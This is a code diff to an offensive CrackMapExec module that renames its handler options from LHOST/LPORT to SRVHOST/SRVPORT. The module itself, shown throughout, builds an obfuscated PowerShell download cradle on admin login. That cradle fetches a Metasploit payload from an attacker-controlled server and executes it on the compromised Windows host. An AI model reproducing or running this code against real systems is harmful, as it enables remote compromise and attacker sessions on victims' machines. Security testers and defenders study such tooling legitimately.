@@ -14,32 +14,31 @@ class CMEModule:
 
     def options(self, context, module_options):
         '''
-            LHOST    IP hosting the handler
-            LPORT    Handler port
-            RAND     Random string given by metasploit
-            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
+            SRVHOST     IP hosting of the stager server
+            SRVPORT     Stager port
+            RAND        Random string given by metasploit
+            SSL         Stager server use https or http (default: https)
         '''
 
-        self.met_payload = 'reverse_https'
-        self.procid = None
+        self.met_ssl = 'https'
 
-        if not 'LHOST' in module_options or not 'LPORT' in module_options or not 'RAND' in module_options:
-            context.log.error('LHOST and LPORT  and RAND options are required!')
+        if not 'SRVHOST' in module_options or not 'SRVPORT' in module_options or not 'RAND' in module_options:
+            context.log.error('SRVHOST and SRVPORT  and RAND options are required!')
             exit(1)
 
-        if 'PAYLOAD' in module_options:
-            self.met_payload = module_options['PAYLOAD']
+        if 'SSL' in module_options:
+            self.met_ssl = module_options['SSL']
 
-        self.lhost = module_options['LHOST']
-        self.lport = module_options['LPORT']
+        self.srvhost = module_options['SRVHOST']
+        self.srvport = module_options['SRVPORT']
         self.rand = module_options['RAND']
 
         self.ps_script = obfs_ps_script('Invoke-MetasploitPayload/Invoke-MetasploitPayload.ps1')
 
     def on_admin_login(self, context, connection):
-        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_payload == 'reverse_http' else 'https',
-                                                            self.lhost,
-                                                            self.lport,
+        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_ssl == 'http' else 'https',
+                                                            self.srvhost,
+                                                            self.srvport,
                                                             self.rand)
         launcher = gen_ps_iex_cradle(context, 'Invoke-MetasploitPayload.ps1', payload, post_back=False)
         connection.ps_execute(launcher, force_ps32=True)
